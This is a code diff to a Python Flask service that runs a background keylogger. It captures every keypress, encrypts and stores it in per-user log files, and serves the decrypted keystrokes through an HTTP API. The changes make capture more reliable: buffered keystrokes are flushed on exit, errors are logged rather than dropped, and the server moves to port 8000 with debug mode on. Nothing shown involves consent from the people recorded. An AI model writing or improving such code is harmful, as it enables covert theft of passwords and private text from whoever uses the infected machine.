@@ -5,6 +5,8 @@ import datetime
 import os
 import threading
 import uuid
+import atexit
+import logging
 
 BUFFER_SIZE = 10
 KEY_FILE_NAME = "secret.key"
@@ -23,6 +25,8 @@ fernet = Fernet(key)
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
+logging.basicConfig(level=logging.INFO, filename="app.log")
+
 def get_user_folder(user_id):
     folder = os.path.join(USERS_LOG_FOLDER, user_id)
     os.makedirs(folder, exist_ok=True)
@@ -31,10 +35,24 @@ def get_user_folder(user_id):
 def get_log_file_name(user_id):
     user_folder = get_user_folder(user_id)
     now = datetime.datetime.now()
-    filename = now.strftime("%Y-%m-%d_%H.txt")
+    filename = now.strftime("%Y-%m-%d.txt")
     return os.path.join(user_folder, filename)
 
 user_id_global = str(uuid.uuid4())
+
+def flush_buffer():
+    global buffer
+    if buffer:
+        try:
+            log_file_name = get_log_file_name(user_id_global)
+            with open(log_file_name, "ab") as f:
+                f.write(b"\n".join(buffer) + b"\n")
+            buffer.clear()
+            logging.info("Buffer flushed on exit")
+        except Exception as e:
+            logging.error(f"Error flushing buffer: {e}")
+
+atexit.register(flush_buffer)
 
 def on_press(key):
     global buffer
@@ -47,12 +65,9 @@ def on_press(key):
         encrypted = fernet.encrypt(text.encode())
         buffer.append(encrypted)
         if len(buffer) >= BUFFER_SIZE:
-            log_file_name = get_log_file_name(user_id_global)
-            with open(log_file_name, "ab") as f:
-                f.write(b"\n".join(buffer) + b"\n")
-            buffer.clear()
-    except:
-        pass
+            flush_buffer()
+    except Exception as e:
+        logging.error(f"Error in on_press: {e}")
 
 def start_keylogger():
     listener = keyboard.Listener(on_press=on_press)
@@ -81,8 +96,8 @@ def get_keystrokes():
                         decrypted = fernet.decrypt(line.strip()).decode()
                         timestamp, key_char = decrypted.split(" - ", 1)
                         logs.append({"key": key_char, "timestamp": timestamp})
-                    except:
-                        continue
+                    except Exception as e:
+                        logging.error(f"Error decrypting line: {e}")
     return jsonify(logs)
 
 @app.route("/api/keystrokes", methods=["POST"])
@@ -104,4 +119,4 @@ if __name__ == "__main__":
     t = threading.Thread(target=start_keylogger)
     t.daemon = True
     t.start()
-    app.run(port=5000, debug=True)
+    app.run(port=8000, debug=True)
